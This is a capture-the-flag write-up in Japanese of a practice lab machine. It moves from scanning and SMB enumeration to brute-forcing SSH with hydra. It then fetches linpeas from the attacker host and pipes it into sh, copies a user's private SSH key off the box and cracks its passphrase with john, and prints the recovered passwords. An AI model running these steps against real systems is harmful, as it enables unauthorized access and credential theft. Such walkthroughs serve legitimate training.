# Find the services exposed by the machine

`nmap`を使用して、ポートスキャンを行う。

```sh
$ nmap -sV 10.10.241.227
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-27 22:12 EDT
Nmap scan report for 10.10.241.227
Host is up (0.077s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.17 seconds
```

# What is the name of the hidden directory on the web server(enter name without /)?

dictionaryは適当。適切なものに変えたい。

```sh
$ gobuster dir --url http://10.10.241.227 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.241.227
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/development          (Status: 301) [Size: 320] [--> http://10.10.241.227/development/]
Progress: 87664 / 87665 (100.00%)
===============================================================                                                      
Finished                                                                                                             
===============================================================  
```

`http://10.10.241.227/development`に行くと、`j.txt`と`dev.txt`が見つかる

j.txt

```txt
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

Jのパスワードは容易に推測できるのだろう。

dev.txt

```txt
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

# User brute-forcing to find the username & password

ユーザーネームとパスワードを調べる。SSHかsambaかな。

```sh
$ smbclient -L 10.10.241.227         
Password for [WORKGROUP\vagrant]:

        Sharename       Type      Comment
        ---------       ----      -------
        Anonymous       Disk      
        IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            BASIC2

$ smbclient //10.10.241.227/Anonymous
Password for [WORKGROUP\vagrant]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Apr 19 13:31:20 2018
  ..                                  D        0  Thu Apr 19 13:13:06 2018
  staff.txt                           N      173  Thu Apr 19 13:29:55 2018

                14318640 blocks of size 1024. 11086704 blocks available
smb: \> more staff.txt 
```

`staff.txt`の中身。

```txt
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
```

上記のJとKが、JanとKayという人物が分かる。

Sambaサーバが動いているので、`enum4linux`を使って情報を取得する。

```sh
$ enum4linux -a 10.10.241.227
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Jun 27 22:48:32 2024

 =========================================( Target Information )=========================================
                                                                                                                     
Target ........... 10.10.241.227                                                                                     
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 10.10.241.227 )===========================
                                                                                                                     
                                                                                                                     
[+] Got domain/workgroup name: WORKGROUP                                                                             
                                                                                                                     
                                                                                                                     
 ===============================( Nbtstat Information for 10.10.241.227 )===============================
                                                                                                                     
Looking up status of 10.10.241.227                                                                                   
        BASIC2          <00> -         B <ACTIVE>  Workstation Service
        BASIC2          <03> -         B <ACTIVE>  Messenger Service
        BASIC2          <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ===================================( Session Check on 10.10.241.227 )===================================
                                                                                                                     
                                                                                                                     
[+] Server 10.10.241.227 allows sessions using username '', password ''                                              
                                                                                                                     
                                                                                                                     
 ================================( Getting domain SID for 10.10.241.227 )================================
                                                                                                                     
Domain Name: WORKGROUP                                                                                               
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                                 
                                                                                                                     
                                                                                                                     
 ==================================( OS information on 10.10.241.227 )==================================
                                                                                                                     
                                                                                                                     
[E] Can't get OS info with smbclient                                                                                 
                                                                                                                     
                                                                                                                     
[+] Got OS info for 10.10.241.227 from srvinfo:                                                                      
        BASIC2         Wk Sv PrQ Unx NT SNT Samba Server 4.3.11-Ubuntu                                               
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


 =======================================( Users on 10.10.241.227 )=======================================
                                                                                                                     
Use of uninitialized value $users in print at ./enum4linux.pl line 972.                                              
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.

 =================================( Share Enumeration on 10.10.241.227 )=================================
                                                                                                                     
                                                                                                                     
        Sharename       Type      Comment
        ---------       ----      -------
        Anonymous       Disk      
        IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            BASIC2

[+] Attempting to map shares on 10.10.241.227                                                                        
                                                                                                                     
//10.10.241.227/Anonymous       Mapping: OK Listing: OK Writing: N/A                                                 

[E] Can't understand response:                                                                                       
                                                                                                                     
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                           
//10.10.241.227/IPC$    Mapping: N/A Listing: N/A Writing: N/A

 ===========================( Password Policy Information for 10.10.241.227 )===========================
                                                                                                                     
                                                                                                                     

[+] Attaching to 10.10.241.227 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] BASIC2
        [+] Builtin

[+] Password Info for Domain: BASIC2

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:                                                                 
                                                                                                                     
                                                                                                                     
Password Complexity: Disabled                                                                                        
Minimum Password Length: 5


 ======================================( Groups on 10.10.241.227 )======================================
                                                                                                                     
                                                                                                                     
[+] Getting builtin groups:                                                                                          
                                                                                                                     
                                                                                                                     
[+]  Getting builtin group memberships:                                                                              
                                                                                                                     
                                                                                                                     
[+]  Getting local groups:                                                                                           
                                                                                                                     
                                                                                                                     
[+]  Getting local group memberships:                                                                                
                                                                                                                     
                                                                                                                     
[+]  Getting domain groups:                                                                                          
                                                                                                                     
                                                                                                                     
[+]  Getting domain group memberships:                                                                               
                                                                                                                     
                                                                                                                     
 ==================( Users on 10.10.241.227 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                     
                                                                                                                     
[I] Found new SID:                                                                                                   
S-1-22-1                                                                                                             

[I] Found new SID:                                                                                                   
S-1-5-32                                                                                                             

[I] Found new SID:                                                                                                   
S-1-5-32                                                                                                             

[I] Found new SID:                                                                                                   
S-1-5-32                                                                                                             

[I] Found new SID:                                                                                                   
S-1-5-32                                                                                                             

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                          
                                                                                                                     
S-1-22-1-1000 Unix User\kay (Local User)                                                                             
S-1-22-1-1001 Unix User\jan (Local User)

[+] Enumerating users using SID S-1-5-21-2853212168-2008227510-3551253869 and logon username '', password ''         
                                                                                                                     
S-1-5-21-2853212168-2008227510-3551253869-501 BASIC2\nobody (Local User)                                             
S-1-5-21-2853212168-2008227510-3551253869-513 BASIC2\None (Domain Group)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                          
                                                                                                                     
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                    
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

 ===============================( Getting printer info for 10.10.241.227 )===============================
                                                                                                                     
No printers returned.                                                                                                


enum4linux complete on Thu Jun 27 22:52:05 2024
```

`jan`と`kay`というユーザーが見つかりますね。
`hydra`を使って`jan`ユーザーのパスワードを割り出します。

```sh
$ hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.241.227 ssh 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-27 23:11:23
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.241.227:22/
[STATUS] 156.00 tries/min, 156 tries in 00:01h, 14344245 to do in 1532:31h, 14 active
[STATUS] 112.33 tries/min, 337 tries in 00:03h, 14344064 to do in 2128:12h, 14 active
[STATUS] 102.29 tries/min, 716 tries in 00:07h, 14343685 to do in 2337:12h, 14 active
[22][ssh] host: 10.10.241.227   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-27 23:19:31
```

janのパスワードが`armando`だと分かりました。

# What service do you use to access the server(answer in abbreviation in all caps)?

SSHですね。

# Enumerate the machine to find any vectors for privilege escalation

SSHで接続します。

```sh
$ ssh jan@10.10.241.227     
The authenticity of host '10.10.241.227 (10.10.241.227)' can't be established.
ED25519 key fingerprint is SHA256:XKjDkLKocbzjCch0Tpriw1PeLPuzDufTGZa4xMDA+o4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.241.227' (ED25519) to the list of known hosts.
jan@10.10.241.227's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Mon Apr 23 15:55:45 2018 from 192.168.56.102
jan@basic2:~$ 
```

ログインできました。

root権限を奪取したいですね。
`linpeas`をダウンロードしておきます。

```sh
$ suod apt install peass
$ cd /usr/share/peass/linpeas 
$ sudo python3 -m http.server 80
```

```sh
jan@basic2:~$ curl 10.23.8.118/linpeas.sh | sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
jan@basic2:~$ 
```

秘密鍵が見つかった。

```txt
══╣ Possible private SSH keys were found!
/home/kay/.ssh/id_rsa
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
```

秘密鍵を使ってSSHでログインしようとすると、パスフレーズを聞かれる。

```sh
jan@basic2:/home/kay/.ssh$ ssh -i id_rsa kay@127.0.0.1
Could not create directory '/home/jan/.ssh'.
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:+Fk53V/LB+2pn4OPL7GN/DuVHVvO0lT9N4W5ifchySQ.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/jan/.ssh/known_hosts).
Enter passphrase for key 'id_rsa': 
```

クラッキングするためにhost側に持ってくる

```sh
$ scp jan@10.10.241.227:/home/kay/\.ssh/id_rsa . 
$ ssh2john id_rsa > id_rsa_hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash 
Created directory: /home/vagrant/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (id_rsa)     
1g 0:00:00:00 DONE (2024-06-28 00:25) 11.11g/s 919288p/s 919288c/s 919288C/s behlat..bball40
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

johnで解析すると、パスフレーズが分かる。
これを使用してSSH接続を試みる。

```sh
$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash 
Created directory: /home/vagrant/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (id_rsa)     
1g 0:00:00:00 DONE (2024-06-28 00:25) 11.11g/s 919288p/s 919288c/s 919288C/s behlat..bball40
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                     
┌──(vagrant㉿kali-linux)-[~/thm/basic_pentesting]
└─$ chmod 600 id_rsa         
                                                                                                                     
┌──(vagrant㉿kali-linux)-[~/thm/basic_pentesting]
└─$ ssh -i id_rsa kay@10.10.241.227
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Mon Apr 23 16:04:07 2018 from 192.168.56.102
```

homeディレクトリ配下にあるpass.bakを開く

```sh
kay@basic2:~$ ls
pass.bak
kay@basic2:~$ cat pass.bak 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```
